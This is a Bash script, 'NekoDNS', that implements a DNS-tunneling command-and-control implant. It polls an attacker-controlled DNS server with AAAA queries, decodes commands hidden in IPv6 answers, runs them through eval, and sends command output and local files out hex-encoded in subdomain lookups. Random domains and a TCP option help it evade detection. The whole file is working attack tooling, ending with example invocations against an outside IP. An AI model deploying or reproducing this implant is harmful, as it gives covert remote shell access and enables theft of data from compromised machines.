#!/usr/bin/env bash
#=======================#
# NekoDNS by @JoelGMSec #
# https://darkbyte.net  #
#=======================#

NekoDNS() {
  local SERVER=""
  local DOMAIN=""
  local LENGTH=32
  local SLEEP=300
  local DEBUG_MODE=0
  local RANDOM_MODE=0
  local TCP_MODE=0

  print_usage() {
    cat <<EOF
Usage: $0 -s <server> [-d <domain>] [-l <chunk_length>] [-i <sleep_ms>] [-random] [-verbose] [-tcp]
  -s <server>    Attacker resolver DNS server IP (or domain) to use (required)
  -d <domain>    Base domain to tunnel over (required unless -random)
  -l <length>    Maximum hex‐chars per chunk (default: 32)
  -i <milsecs>   Sleep interval between polls/sends in ms (default: 300)
  -random        Use random subdomains (if set, -d is optional)
  -verbose       Enable debug/verbose output
  -tcp           Use TCP for DNS queries
  -help          Show this help message
EOF
    exit 1
  }

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -s)
        if [[ -n "$2" ]]; then
          SERVER="$2"
          shift 2
        else
          echo "Error: -s requires a server argument"
          print_usage
        fi
        ;;
      -d)
        if [[ -n "$2" ]]; then
          DOMAIN="$2"
          shift 2
        else
          echo "Error: -d requires a domain argument"
          print_usage
        fi
        ;;
      -l)
        if [[ -n "$2" ]]; then
          LENGTH="$2"
          shift 2
        else
          echo "Error: -l requires a length argument"
          print_usage
        fi
        ;;
      -i)
        if [[ -n "$2" ]]; then
          SLEEP="$2"
          shift 2
        else
          echo "Error: -i requires a sleep argument"
          print_usage
        fi
        ;;
      -verbose)
        DEBUG_MODE=1
        shift
        ;;
      -random)
        RANDOM_MODE=1
        shift
        ;;
      -tcp)
        TCP_MODE=1
        shift
        ;;
      -help|--help|-h)
        print_usage
        ;;
      *)
        echo "Error: Unknown option $1"
        print_usage
        ;;
    esac
  done

  if [[ -z "$SERVER" ]] ; then
    echo "Error: -s <server> is required."
    print_usage
  fi

  if [[ $RANDOM_MODE -eq 0 && -z "$DOMAIN" ]]; then
    echo "Error: -d <domain> is mandatory unless -random is specified."
    print_usage
  fi

  debug() {
    if [[ $DEBUG_MODE -eq 1 ]]; then
      echo "[DEBUG] $*" >&2
    fi
  }

  to_lower() {
    echo "$1" | tr '[:upper:]' '[:lower:]'
  }

  get_random_subdomain() {
    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c "$LENGTH" | tr '[:upper:]' '[:lower:]'
  }

  get_random_segment() {
    local MIN_LEN="$1"
    local MAX_LEN="$2"
    local LEN=$(( MIN_LEN + RANDOM % (MAX_LEN - MIN_LEN + 1) ))
    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c "$LEN" | tr '[:upper:]' '[:lower:]'
  }

  get_random_domain() {
    local seg1 seg2
    seg1="$(get_random_segment 2 4)"
    seg2="$(get_random_segment 2 3)"
    echo "${seg1}.${seg2}"
  }

  reverse_hex() {
    echo "$1" | rev
  }

  hex_to_ascii() {
    echo "$1" | xxd -r -p 2>/dev/null || true
  }

  ascii_to_hex() {
    xxd -p | tr -d '\n' | tr '[:upper:]' '[:lower:]'
  }

  expand_ipv6() {
    local ip="$(to_lower "$1")"
    local full=""
    if [[ "$ip" == *"::"* ]]; then
      local before="${ip%%::*}"
      local after="${ip#*::}"
      local -a arr_before arr_after
      if [[ -n "$before" ]]; then
        IFS=':' read -ra arr_before <<< "$before"
      else
        arr_before=()
      fi
      if [[ -n "$after" ]]; then
        IFS=':' read -ra arr_after <<< "$after"
      else
        arr_after=()
      fi
      local count_before=${#arr_before[@]}
      local count_after=${#arr_after[@]}
      local missing=$((8 - count_before - count_after))
      local zeros=""
      for ((i=0;i<missing;i++)); do zeros+="0000:"; done
      zeros="${zeros%?}"
      if [[ -n "$before" ]]; then
        full="${before}"
      else
        full=""
      fi
      if [[ -n "$full" && -n "$zeros" ]]; then
          full+=":"
      fi
      full+="${zeros}"
      if [[ -n "$after" ]]; then
          if [[ -n "$full" ]]; then
              full+=":"
          fi
          full+="${after}"
      fi
    else
      full="$ip"
    fi

    IFS=':' read -ra groups <<< "$full"
    local hextotal=""
    for g in "${groups[@]}"; do
      local part
      printf -v part "%04x" "0x$g"
      hextotal+="$part"
    done
    echo "$hextotal"
  }

  send_chunk() {
    local TYPE="$1"
    local HEXDATA="$2"
    local DOMAIN_TO_USE="$3"
    local SUBDOMAIN REVERSED DUMMY_HEX FQDN RESP RES_SEG
    local RAW_HEX LENGTH_BYTE LENGTH_CMD HEX_PART REV_HEX DECODED
    local TCP_FLAG=""

    if [[ $TCP_MODE -eq 1 ]]; then
      TCP_FLAG="+tcp"
    fi

    if [[ "$TYPE" == "a" ]]; then
      SUBDOMAIN="a.$(get_random_subdomain).${DOMAIN_TO_USE}"
      debug "Polling upload with: ${SUBDOMAIN}"
      RESP=$(dig +short $TCP_FLAG @"$SERVER" -t AAAA "$SUBDOMAIN" | head -n1)
      if [[ -z "$RESP" ]]; then
        echo ""
        return
      fi
      if [[ "$RESP" == "::1" ]]; then
        echo "::1"
        return
      fi

      RAW_HEX="$(expand_ipv6 "$RESP")"
      debug "Expanded IPv6 to hex: $RAW_HEX"
      LENGTH_BYTE="${RAW_HEX:0:2}"
      LENGTH_CMD=$((16#${LENGTH_BYTE}))
      debug "Upload payload length: $LENGTH_CMD"
      if [[ "$LENGTH_CMD" -eq 0 ]]; then
        echo ""
        return
      fi
      HEX_PART="${RAW_HEX:2:$(( LENGTH_CMD * 2 ))}"
      REV_HEX="$(reverse_hex "$HEX_PART")"
      echo "$REV_HEX"
      return
    fi

    if [[ -z "$HEXDATA" ]]; then
      DUMMY_HEX="$(tr -dc 'A-Za-z0-9' < /dev/urandom | head -c "$LENGTH" | tr '[:upper:]' '[:lower:]')"
      REVERSED="$(reverse_hex "$DUMMY_HEX")"
    else
      REVERSED="$(reverse_hex "$HEXDATA")"
    fi

    SUBDOMAIN="${TYPE}.${REVERSED}.${DOMAIN_TO_USE}"
    debug "Sending chunk to: ${SUBDOMAIN}"
    dig +short $TCP_FLAG @"$SERVER" -t A "$SUBDOMAIN" >/dev/null 2>&1
    return 0
  }

  send_file_content() {
    local FILE_PATH="$1"
    local CHUNK_LEN="$2"
    local DOMAIN_TO_USE="$3"
    local FILE_HEX CHUNK OFFSET REM_LEN DYNAMIC_DOMAIN

    if [[ ! -f "$FILE_PATH" ]]; then
      debug "File not found: $FILE_PATH"
      return 1
    fi

    FILE_HEX="$(xxd -p "$FILE_PATH" | tr -d '\n' | tr '[:upper:]' '[:lower:]')"
    if [[ $RANDOM_MODE -eq 1 ]]; then
      DYNAMIC_DOMAIN="$(get_random_domain)"
    else
      DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
    fi
    
    send_chunk "s" "" "$DYNAMIC_DOMAIN" >/dev/null
    sleep "$(awk "BEGIN { print $SLEEP/1000 }")"

    OFFSET=0
    REM_LEN=${#FILE_HEX}
    while [[ $OFFSET -lt $REM_LEN ]]; do
      CHUNK="${FILE_HEX:OFFSET:CHUNK_LEN}"
      
      if [[ $RANDOM_MODE -eq 1 ]]; then
        DYNAMIC_DOMAIN="$(get_random_domain)"
      else
        DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
      fi
      
      send_chunk "d" "$CHUNK" "$DYNAMIC_DOMAIN" >/dev/null
      sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
      OFFSET=$(( OFFSET + CHUNK_LEN ))
    done

    if [[ $RANDOM_MODE -eq 1 ]]; then
      DYNAMIC_DOMAIN="$(get_random_domain)"
    else
      DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
    fi
    
    send_chunk "e" "" "$DYNAMIC_DOMAIN" >/dev/null
    sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
    return 0
  }

  main_loop() {
    local CMD_BUFFER="" DOMAIN_TO_USE POLL_NAME RESP_IPV6 RAW_HEX LENGTH_BYTE \
          LENGTH_CMD HEX_PART REV_HEX DECODED_CMD COMMAND_FINAL OUTPUT DYNAMIC_DOMAIN
    local TCP_FLAG=""

    if [[ $TCP_MODE -eq 1 ]]; then
      TCP_FLAG="+tcp"
      debug "TCP mode enabled - all DNS queries will use TCP"
    else
      debug "UDP mode (default) - all DNS queries will use UDP"
    fi

    while true; do
      if [[ $RANDOM_MODE -eq 1 ]]; then
        DOMAIN_TO_USE="$(get_random_domain)"
      else
        DOMAIN_TO_USE="$DOMAIN"
      fi

      POLL_NAME="a.$(get_random_subdomain).${DOMAIN_TO_USE}"
      debug "Polling with domain: $POLL_NAME"
      RESP_IPV6=$(dig +short $TCP_FLAG @"$SERVER" -t AAAA "$POLL_NAME" | head -n1)
      if [[ -z "$RESP_IPV6" ]]; then
        debug "No AAAA response. Sleeping..."
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        continue
      fi
      
      debug "Received IPv6: $RESP_IPV6"
      if [[ "$RESP_IPV6" == "::" || "$RESP_IPV6" == "::1" ]]; then
        debug "No command received (:: or ::1). Sleeping..."
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        continue
      fi

      RAW_HEX="$(expand_ipv6 "$RESP_IPV6")"
      if [[ -z "$RAW_HEX" || ${#RAW_HEX} -ne 32 ]]; then
        debug "Failed to expand IPv6 or invalid length. Ignoring. RAW_HEX: $RAW_HEX"
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        continue
      fi

      debug "Raw hex from IPv6: $RAW_HEX"
      LENGTH_BYTE="${RAW_HEX:0:2}"
      if ! [[ "$LENGTH_BYTE" =~ ^[0-9a-fA-F]{2}$ ]]; then
          debug "Invalid length byte received: $LENGTH_BYTE. Ignoring."
          sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
          continue
      fi

      LENGTH_CMD=$((16#${LENGTH_BYTE}))
      debug "Command payload length: $LENGTH_CMD bytes"
      if [[ $LENGTH_CMD -eq 0 ]]; then
        debug "Zero length command. Sleeping..."
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        continue
      fi

      HEX_PART="${RAW_HEX:2:$(( LENGTH_CMD * 2 ))}"
      REV_HEX="$(reverse_hex "$HEX_PART")"
      DECODED_CMD="$(hex_to_ascii "$REV_HEX")"
      debug "Decoded command fragment: '$DECODED_CMD'"
      if [[ "$DECODED_CMD" == *"[->]" ]]; then
        CMD_BUFFER+="${DECODED_CMD%"[->]"}"
        debug "Buffered fragment: '$CMD_BUFFER'"
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        continue
      elif [[ -n "$CMD_BUFFER" ]]; then
        if [[ "$DECODED_CMD" == "[->]"* ]]; then
          DECODED_CMD="${DECODED_CMD#"[->]"}"
        fi
        COMMAND_FINAL="$CMD_BUFFER$DECODED_CMD"
        CMD_BUFFER=""
        debug "Reassembled full command: '$COMMAND_FINAL'"
      else
        COMMAND_FINAL="$DECODED_CMD"
        debug "Full command: '$COMMAND_FINAL'"
      fi

      COMMAND_FINAL="$(echo -n "$COMMAND_FINAL" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
      local COMMAND_LOWER="$(to_lower "$COMMAND_FINAL")"
      OUTPUT=""
      if [[ "$COMMAND_LOWER" == cd\ * ]]; then
          local PATH_TO_CD="${COMMAND_FINAL:3}"
          PATH_TO_CD="$(echo -n "$PATH_TO_CD" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
          debug "CD command: changing directory to '$PATH_TO_CD'"
          if ! cd "$PATH_TO_CD" 2>&1; then
              OUTPUT="[-] CD failed: directory not found or permission denied."
              debug "CD command failed for '$PATH_TO_CD'"
          fi
          
      elif [[ "$COMMAND_LOWER" == download\ * ]]; then
        ARG_STR="${COMMAND_FINAL:9}"
        IFS='!' read -r LOCAL_PATH REMOTE_PATH <<< "$ARG_STR"
        LOCAL_PATH="$(echo -n "$LOCAL_PATH" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
        REMOTE_PATH="$(echo -n "$REMOTE_PATH" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
        debug "Download request (client sending file): local='$LOCAL_PATH'"
        if send_file_content "$LOCAL_PATH" "$LENGTH" "$DOMAIN_TO_USE"; then
          OUTPUT="[+] File '$LOCAL_PATH' content sent to server for download."
        else
          OUTPUT="[-] Failed to read or send file '$LOCAL_PATH'."
        fi

      elif [[ "$COMMAND_LOWER" == upload\ * ]]; then
        ARG_STR="${COMMAND_FINAL:7}"
        IFS='!' read -r REMOTE_PATH LOCAL_PATH <<< "$ARG_STR"
        LOCAL_PATH="$(echo -n "$LOCAL_PATH" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
        REMOTE_PATH="$(echo -n "$REMOTE_PATH" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
        debug "Upload request (client receiving file): local='$LOCAL_PATH'"
        send_chunk "s" "" "$DOMAIN_TO_USE" >/dev/null
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        send_chunk "e" "" "$DOMAIN_TO_USE" >/dev/null
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        local FILE_HEX_BUFFER=""
        local IS_RECEIVING=1
        local START_TS=$(date +%s)
        local TIMEOUT=120

        debug "Receiving upload into '$LOCAL_PATH'"
        while [[ $IS_RECEIVING -eq 1 && $(( $(date +%s) - START_TS )) -lt $TIMEOUT ]]; do
          if [[ $RANDOM_MODE -eq 1 ]]; then
            DYNAMIC_DOMAIN="$(get_random_domain)"
          else
            DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
          fi
          
          CHUNK_HEX="$(send_chunk "a" "" "$DYNAMIC_DOMAIN")"
          if [[ -z "$CHUNK_HEX" ]]; then
            sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
            continue
          fi
          if [[ "$CHUNK_HEX" == "::1" ]]; then
            if echo -n "$FILE_HEX_BUFFER" | xxd -r -p > "$LOCAL_PATH" 2>/dev/null; then
              OUTPUT="[+] File '$LOCAL_PATH' received and saved locally."
              debug "File written: '$LOCAL_PATH'"
            else
              OUTPUT="[-] Error writing file '$LOCAL_PATH'."
              debug "Failed to write file: '$LOCAL_PATH'"
            fi
            IS_RECEIVING=0
            break
          fi
          debug "Received fragment hex: '$CHUNK_HEX'"
          FILE_HEX_BUFFER+="$CHUNK_HEX"
          sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        done

        if [[ $IS_RECEIVING -eq 1 ]]; then
            OUTPUT="[-] File reception timed out for '$LOCAL_PATH'."
            debug "File reception timed out for '$LOCAL_PATH'."
        fi

      elif [[ "$COMMAND_LOWER" == "exit" ]]; then
        debug "Received termination command - exiting client"
        OUTPUT="[+] Client terminating..."
        send_chunk "e" "" "$DOMAIN_TO_USE" >/dev/null
        debug "Client exiting.."
        exit 0 

      else
        debug "Executing local shell command: $COMMAND_FINAL"
        OUTPUT="$(eval "$COMMAND_FINAL" 2>&1)"
        if [[ -z "$OUTPUT" ]]; then
            debug "Command '$COMMAND_FINAL' produced no output."
            OUTPUT=""
        fi
      fi

      if [[ -n "$OUTPUT" ]]; then
        hexstream="$(printf "%s" "$OUTPUT" | ascii_to_hex)"
        if [[ $RANDOM_MODE -eq 1 ]]; then
          DYNAMIC_DOMAIN="$(get_random_domain)"
        else
          DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
        fi
        
        send_chunk "s" "" "$DYNAMIC_DOMAIN" >/dev/null
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        total_len=${#hexstream}
        offset=0

        while [[ $offset -lt $total_len ]]; do
          chunk="${hexstream:offset:LENGTH}"
          if [[ $RANDOM_MODE -eq 1 ]]; then
            DYNAMIC_DOMAIN="$(get_random_domain)"
          else
            DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
          fi
          
          send_chunk "d" "$chunk" "$DYNAMIC_DOMAIN" >/dev/null
          sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
          offset=$(( offset + LENGTH ))
        done
        
        if [[ $RANDOM_MODE -eq 1 ]]; then
          DYNAMIC_DOMAIN="$(get_random_domain)"
        else
          DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
        fi 
        send_chunk "e" "" "$DYNAMIC_DOMAIN" >/dev/null
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"

      else
        if [[ $RANDOM_MODE -eq 1 ]]; then
          DYNAMIC_DOMAIN="$(get_random_domain)"
        else
          DYNAMIC_DOMAIN="$DOMAIN_TO_USE"
        fi      
        send_chunk "s" "" "$DYNAMIC_DOMAIN" >/dev/null
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
        send_chunk "e" "" "$DYNAMIC_DOMAIN" >/dev/null
        sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
      fi

      sleep "$(awk "BEGIN { print $SLEEP/1000 }")"
    done
  }

  main_loop "$@"
}

# Examples
# NekoDNS -s 88.66.44.22 -d test.com -l 32 -i 300 -random -verbose
# NekoDNS -s 88.66.44.22 -d test.com -l 32 -i 300 -random -verbose -tcp

NekoDNS $*
